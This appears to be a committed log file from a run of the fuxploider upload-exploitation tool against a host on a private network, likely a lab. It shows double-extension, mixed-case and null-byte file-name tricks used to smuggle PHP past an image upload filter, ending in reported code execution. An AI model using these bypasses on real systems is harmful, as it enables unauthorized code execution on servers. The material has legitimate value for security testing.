@@ -1,0 +1,67 @@
+2024-02-04 10:54:58 INFO - ### Starting detection of valid extensions ...
+2024-02-04 10:54:58 INFO - [1m[42mExtension jpg seems valid for this form.[m
+2024-02-04 10:54:58 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:54:58 INFO - [1m[42mExtension png seems valid for this form.[m
+2024-02-04 10:54:58 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:54:58 INFO - ### Tried 100 extensions,  2 are valid.
+[1;32m
+
+ ___             _     _   _ 
+|  _|_ _ _ _ ___| |___|_|_| |___ ___ 
+|  _| | |_'_| . | | . | | . | -_|  _|
+|_| |___|_,_|  _|_|___|_|___|___|_|
+            |_|
+
+[1m[42m{version 1.0.0}[m
+
+[m[!] legal disclaimer: Usage of fuxploider for attacking targets without
+prior mutual consent is illegal. It is the end user's responsibility to obey
+all applicable local, state and federal laws. Developers assume no liability
+and are not responsible for any misuse or damage caused by this program.
+
+[*] starting at 10:54:58
+Extensions detection: 0:00:00.114128
+Start uploading payloads? [Y/n]: 2024-02-04 10:54:58 INFO - ### Starting code execution detection (messing with file extensions and mime types...)
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp7n26at8y.php1.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpi7fiyv7g.php2.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpzfbigamj.php3.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpawxwzk2s.php.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmptll2ogl4.php5.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp9u7_v8fr.php4.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpgqg6c0wo.phtml.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp0_sxpdja.pht.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmplts87y8n.PhP.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpzsgpuq5s.pHp1.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpucnnc8qo.pHp.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmppo4tm5o5.Php.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp4h2n382h.pHtMl.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpom4msqe0.pHP2.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp68tqfpuk.php2.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpajt73lsy.PHp5.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp0wwlw29n.php1.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpy81ywkay.php.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp08iineiw.php4.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpswmttrn7.php3.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpd7mgzenb.php5.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp5exz7d6e.phtml.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp3vz9cbvh.PhP.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpenzo8hq2.pht.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp_w7s0srp.pHp.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpfulp3nvw.Php.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpzp12enoc.pHP2.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpr7lxpbhm.pHp1.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpg1gjn0hy.PHp5.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp5h70bqg6.pHtMl.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmpugduso67.php1%00.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp8xcn1y_t.php2%00.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 WARNING - Code exec detection returned an http code of 404.
+2024-02-04 10:54:59 WARNING - Code exec detection returned an http code of 404.
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp74v_o6oy.php%00.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 WARNING - Code exec detection returned an http code of 404.
+2024-02-04 10:54:59 INFO - [1;32mUpload of 'tmp32wgttvq.php3%00.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:54:59 WARNING - Code exec detection returned an http code of 404.
+2024-02-04 10:54:59 INFO - [1m[42mCode execution obtained ('.php%00.jpg','image/jpeg','phpinfo','http://172.22.1.12/uploads/tmp74v_o6oy.php')[m
+2024-02-04 10:54:59 INFO - 1 entry point(s) found using 234 HTTP requests.
+
+Found the following entry points: 
+[{'suffix': '.php%00.jpg', 'mime': 'image/jpeg', 'templateName': 'phpinfo', 'codeExecURL': None, 'dynamicPayload': None, 'payloadFilename': 'template.php', 'staticFilename': None}]
